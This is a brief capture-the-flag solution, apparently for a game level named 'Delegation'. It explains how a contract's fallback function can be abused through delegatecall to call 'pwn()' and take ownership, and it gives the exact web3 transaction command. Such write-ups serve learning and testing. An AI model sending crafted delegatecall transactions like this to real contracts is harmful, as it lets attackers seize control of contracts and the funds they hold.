# Deligation

Just use the fallback function in the Delegation contract to delegate call function "pwn()".

`contract.sendTransaction({from:player,data:web3.eth.abi.encodeFunctionSignature("pwn()")})`
